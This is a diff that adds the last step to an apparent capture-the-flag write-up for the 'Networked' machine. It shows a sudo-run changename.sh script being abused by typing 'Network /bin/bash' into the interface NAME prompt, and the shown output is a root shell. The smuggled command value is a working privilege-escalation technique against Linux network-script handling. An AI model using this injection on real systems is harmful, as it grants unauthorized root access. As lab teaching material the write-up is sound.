@@ -221,3 +221,20 @@ done
 /sbin/ifup guly0
 ```
 Reading the script there is something that stands out. It writes the input that you give to the program to <b>/etc/sysconfig/network-scripts/ifcfg-guly</b>. Doing a quick google search on how this can be exploited reveals *[this.](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)*
+
+After reading that article you should have a pretty good idea of what to do
+```
+[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
+interface NAME:
+Network /bin/bash
+interface PROXY_METHOD:
+test
+interface BROWSER_ONLY:
+test
+interface BOOTPROTO:
+test
+[root@networked network-scripts]# whoami
+root
+```
+Now that we are root we can read the <b>root.txt</b> file.
+<br><br><br><br>
